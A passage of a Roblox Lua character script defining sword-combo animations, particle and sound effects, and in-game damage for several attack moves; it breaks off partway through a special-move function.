sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
waveEff(5,"Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,math.rad(math.random(-360,360)),0),vt(5,0.25,5),0.05,0.015,BrickColor.new("Cyan"))
waveEff(5,"Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,math.rad(math.random(-360,360)),0),vt(10,0.25,10),0.05,0.015,BrickColor.new("Royal purple"))
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(10),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-10)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(-20)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(-20),math.rad(-30),math.rad(130)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(-13),math.rad(10),math.rad(-10)),.3)
end
hum.CameraOffset = vt(0,0,0)
weaponweld.Part0 = rarm
for i = 0, 2, 0.1 do
		swait()
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-40),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(1),math.rad(5)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.1,0.1,0)*angles(math.rad(0),math.rad(0),math.rad(40)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(-40)),.3)
RW.C0=clerp(RW.C0,cf(1.25,0.5,-0.65)*angles(math.rad(100),math.rad(0),math.rad(-23)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(110),math.rad(0),math.rad(-85)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
local hitb = CreateParta(m,1,1,"SmoothPlastic",BrickColor.Random())
hitb.Anchored = true
hitb.CFrame = root.CFrame + root.CFrame.lookVector*4
MagniDamage(hitb, 4, 40,73, 0, "Normal",153092213)
slash(5,5,true,"Round","Add","Out",hitb.CFrame*CFrame.Angles(0,math.rad(math.random(-360,360)),0),vt(0.05,0.01,0.05),0.01,BrickColor.new("White"))
CFuncs["Sound"].Create("rbxassetid://200633196", rarmor, 1, 1.05)
CFuncs["Sound"].Create("rbxassetid://200633108", rarmor, 1.5, 1.025)
CFuncs["Sound"].Create("rbxassetid://234365549", rarmor, 1, 1)
for i = 0, 2, 0.1 do
		swait()
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-20)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(50),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(-0.1,-0.25,0)*angles(math.rad(10),math.rad(0),math.rad(-50)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(50)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(80),math.rad(0),math.rad(70)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(100),math.rad(0),math.rad(-50)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
end
hitb:Destroy()
hum.WalkSpeed = 24
OWS = hum.WalkSpeed
	attack = false
end

function unequip()
	attack = true
	equipped = false
	hum.WalkSpeed = 0
hum.WalkSpeed = 16
OWS = hum.WalkSpeed
tl1.Enabled = false
CFuncs["Sound"].Create("rbxassetid://200633029", rarmor, 1, 1)
weaponweld.C1=clerp(weaponweld.C1,cf(-3,0,-0.5)*angles(math.rad(0),math.rad(0),math.rad(-40)),.5)
weaponweld.Part0 = tors
	attack = false
end

------------------
function attackone()
attack = true
hum.WalkSpeed = 4
for i = 0, 2, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-40),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(1),math.rad(5)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.1,0.1,0)*angles(math.rad(0),math.rad(0),math.rad(40)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(-40)),.3)
RW.C0=clerp(RW.C0,cf(1.25,0.5,-0.65)*angles(math.rad(100),math.rad(0),math.rad(-23)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(110),math.rad(0),math.rad(-85)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
local hitb = CreateParta(m,1,1,"SmoothPlastic",BrickColor.Random())
hitb.Anchored = true
hitb.CFrame = root.CFrame + root.CFrame.lookVector*4
MagniDamage(hitb, 4, 24,30, 0, "Normal",153092213)
CFuncs["Sound"].Create("rbxassetid://200633196", rarmor, 1, 1.05)
CFuncs["Sound"].Create("rbxassetid://200633108", rarmor, 1.5, 1.025)
CFuncs["Sound"].Create("rbxassetid://234365549", rarmor, 1, 1)
for i = 0, 1, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-20)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(50),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(-0.1,-0.25,0)*angles(math.rad(10),math.rad(0),math.rad(-50)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(50)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(80),math.rad(0),math.rad(70)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(100),math.rad(0),math.rad(-50)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
end
hitb:Destroy()
attack = false
hum.WalkSpeed = 24
end
function attacktwo()
attack = true
hum.WalkSpeed = 4
for i = 0, 1, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(20),math.rad(5)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(-0.1,0.1,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(40)),.3)
RW.C0=clerp(RW.C0,cf(1.25,0.5,-0.65)*angles(math.rad(100),math.rad(0),math.rad(-23)),.3)
LW.C0=clerp(LW.C0,cf(-0.5,0.5,-0.25)*angles(math.rad(90),math.rad(0),math.rad(40)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(180),math.rad(0)),.3)
end
local hitb = CreateParta(m,1,1,"SmoothPlastic",BrickColor.Random())
hitb.Anchored = true
hitb.CFrame = root.CFrame + root.CFrame.lookVector*4
MagniDamage(hitb, 4, 24,30, 0, "Normal",153092213)
CFuncs["Sound"].Create("rbxassetid://200633281", rarmor, 1, 1.05)
CFuncs["Sound"].Create("rbxassetid://161006195", rarmor, 1.5, 1.025)
for i = 0, 1, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-30),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.2,-0.25,0)*angles(math.rad(10),math.rad(0),math.rad(90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(-90)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(80),math.rad(0),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(100),math.rad(0),math.rad(-50)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(180),math.rad(70)),.3)
end
attack = false
hum.WalkSpeed = 24
end
function attackthree()
attack = true
hum.WalkSpeed = 4
for i = 0, 1, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-30),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(5)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(-0.1,0.1,0)*angles(math.rad(0),math.rad(0),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0),math.rad(60)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(53)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-10)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(90),math.rad(-20)),.3)
end
for x = 0, 2 do
CFuncs["Sound"].Create("rbxassetid://200633108", rarmor, 1, 1.05)
CFuncs["Sound"].Create("rbxassetid://234365573", rarmor, 1.5, 1.025)
local hitb = CreateParta(m,1,1,"SmoothPlastic",BrickColor.Random())
hitb.Anchored = true
hitb.CFrame = root.CFrame + root.CFrame.lookVector*4
MagniDamage(hitb, 4, 12,15, 0, "Normal",153092213)
for i = 0, 1, 0.6 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(40),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.2,-0.25,0)*angles(math.rad(-2),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-20)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(0),math.rad(30),math.rad(90)),.3)
end
for i = 0, 1, 0.6 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(40),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.2,-0.25,0)*angles(math.rad(-2),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-20)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(180)),.3)
end
for i = 0, 1, 0.6 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(40),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.2,-0.25,0)*angles(math.rad(-2),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-20)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(0),math.rad(-30),math.rad(270)),.3)
end
for i = 0, 1, 0.6 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(40),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.2,-0.25,0)*angles(math.rad(-2),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-20)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
end
attack = false
hum.WalkSpeed = 24
end
------------------
function spinnyblade()
attack = true
hum.WalkSpeed = 1
hum.JumpPower = 0
CFuncs["Sound"].Create("rbxassetid://1368583274", root, 4.5, 1)
local bgui = Instance.new("BillboardGui",root)
bgui.Size = UDim2.new(25, 0, 25, 0)
local imgc = Instance.new("ImageLabel",bgui)
imgc.BackgroundTransparency = 1
imgc.ImageTransparency = 1
imgc.Size = UDim2.new(1,0,1,0)
imgc.Image = "rbxassetid://997291547"
imgc.ImageColor3 = Color3.new(0,0.5,1)
local imgc2 = imgc:Clone()
imgc2.Parent = bgui
imgc2.Position = UDim2.new(-0.5,0,-0.5,0)
imgc2.Size = UDim2.new(2,0,2,0)
imgc2.ImageColor3 = Color3.new(0.5,0,1)
for i = 0, 10, 0.1 do
		swait()
imgc.ImageTransparency = imgc.ImageTransparency - 0.01
imgc.Rotation = imgc.Rotation + 1
imgc2.ImageTransparency = imgc2.ImageTransparency - 0.01
imgc2.Rotation = imgc2.Rotation - 1
bgui.Size = bgui.Size - UDim2.new(0.25, 0, 0.25, 0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-10,10)),math.rad(math.random(-360,360)),math.rad(math.random(-10,10))),vt(0.1,0.01,0.1),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
hum.CameraOffset = vt(math.random(-10,10)/50,math.random(-10,10)/50,math.random(-10,10)/50)
sphereMK(5,math.random(4,25)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-10,10)),math.rad(math.random(-10,10))),0.75,0.75,20,-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
sphereMK(5,math.random(1,15)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-25,25)),math.rad(math.random(-25,25)),math.rad(math.random(-25,25))),0.75,0.75,20,-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
waveEff(5,"Add","In",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,math.rad(math.random(-360,360)),0),vt(15,0.25,15),-0.075,0.05,BrickColor.new("White"))
	RH.C0=clerp(RH.C0,cf(1,-0.5,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-40),math.rad(10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(1),math.rad(20)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.1,0.2,-0.3)*angles(math.rad(10),math.rad(0),math.rad(50)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(-50)),.3)
RW.C0=clerp(RW.C0,cf(1.25,0.5,-0.65)*angles(math.rad(100),math.rad(0),math.rad(-23)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(110),math.rad(0),math.rad(-85)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
imgc.ImageTransparency = 1
hum.CameraOffset = vt(0,0,0)
waveEff(2,"Add","Out",root.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(6,10,6),0.5,0.8,BrickColor.new("White"))
waveEff(3,"Add","Out",root.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(6,10,6),0.5,0.4,BrickColor.new("White"))
waveEff(4,"Add","Out",root.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(6,10,6),0.5,0.2,BrickColor.new("White"))
waveEff(5,"Add","Out",root.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(6,10,6),0.5,0.1,BrickColor.new("White"))
waveEff(6,"Add","Out",root.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(6,10,6),0.5,0.05,BrickColor.new("White"))
for i = 0, 9 do
slash(math.random(10,25)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,0,math.random(-30,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-360,360)),math.rad(math.random(-10,10))),vt(0.1,0.01,0.1),math.random(75,250)/250,BrickColor.new("White"))
end
CFuncs["Sound"].Create("rbxassetid://430315987", root, 1.5, 1)
CFuncs["Sound"].Create("rbxassetid://1295446488", root, 3, 1)
for x = 0, 14 do
CFuncs["Sound"].Create("rbxassetid://200633281", rarmor, 1, 1.05)
CFuncs["Sound"].Create("rbxassetid://161006195", rarmor, 1.5, 1.025)
MagniDamage(tors, 10, 60,85, 0, "Normal",153092213)
CFuncs["Sound"].Create("rbxassetid://200632992", rarmor, 1.25, 1)
slash(5,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,3,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.05,0.01,0.05),math.random(1,10)/100,BrickColor.new("White"))
for i = 0, 1, 0.6 do
		swait()
sphereMK(2,-1,"Add",root.CFrame*CFrame.new(math.random(-8,8),math.random(-8,8),math.random(-3,8))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),0.5,0.5,math.random(5,25),-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
root.CFrame = root.CFrame + root.CFrame.lookVector*2
root.Velocity = vt(0,0,0)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,3)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
end
slash(5,2.5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,3,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.05,0.01,0.05),math.random(1,10)/100,BrickColor.new("White"))
CFuncs["Sound"].Create("rbxassetid://200632992", rarmor, 1.25, 1)
MagniDamage(tors, 10, 60,85, 0, "Normal",153092213)
for i = 0, 1, 0.6 do
		swait()
sphereMK(2,-1,"Add",root.CFrame*CFrame.new(math.random(-8,8),math.random(-8,8),math.random(-3,8))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),0.5,0.5,math.random(5,25),-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
root.CFrame = root.CFrame + root.CFrame.lookVector*3
root.Velocity = vt(0,0,0)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,3)*angles(math.rad(90),math.rad(0),math.rad(90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
end
slash(5,2.5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,3,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.05,0.01,0.05),math.random(1,10)/100,BrickColor.new("White"))
CFuncs["Sound"].Create("rbxassetid://200632992", rarmor, 1.25, 1)
MagniDamage(tors, 10, 60,85, 0, "Normal",153092213)
for i = 0, 1, 0.6 do
		swait()
sphereMK(2,-1,"Add",root.CFrame*CFrame.new(math.random(-8,8),math.random(-8,8),math.random(-3,8))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),0.5,0.5,math.random(5,25),-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
root.CFrame = root.CFrame + root.CFrame.lookVector*3
root.Velocity = vt(0,0,0)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,3)*angles(math.rad(180),math.rad(0),math.rad(90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
end
slash(5,2.5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,3,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.05,0.01,0.05),math.random(1,10)/100,BrickColor.new("White"))
CFuncs["Sound"].Create("rbxassetid://200632992", rarmor, 1.25, 1)
MagniDamage(tors, 10, 60,85, 0, "Normal",153092213)
for i = 0, 1, 0.6 do
		swait()
sphereMK(2,-1,"Add",root.CFrame*CFrame.new(math.random(-8,8),math.random(-8,8),math.random(-3,8))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),0.5,0.5,math.random(5,25),-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
root.CFrame = root.CFrame + root.CFrame.lookVector*3
root.Velocity = vt(0,0,0)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,3)*angles(math.rad(270),math.rad(0),math.rad(90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.3)
end
end
hum.WalkSpeed = 0
for i = 0, 5, 0.1 do
		swait()
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-20)),.2)
LH.C0=clerp(LH.C0,cf(-1,-0.6,-0.5)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(20),math.rad(-12)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0.1,0.2,-0.35)*angles(math.rad(10),math.rad(0),math.rad(-40)),.2)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(40)),.2)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0)*angles(math.rad(90),math.rad(0),math.rad(110)),.2)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0)*angles(math.rad(45),math.rad(0),math.rad(-20)),.2)
weaponweld.C1=clerp(weaponweld.C1,cf(2,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.2)
end
bgui:Destroy()
attack = false
hum.WalkSpeed = 24
hum.JumpPower = 50
end

function eightbitmegablade()
attack = true
hum.WalkSpeed = 0
hum.JumpPower = 0
CFuncs["Sound"].Create("rbxassetid://1368583274", larm, 4.5, 1.2)
local OverCut = false
cam.CameraSubject = Humanoid
cam.CameraType = "Scriptable"
coroutine.resume(coroutine.create(function()
while true do
swait()
if OverCut == false then
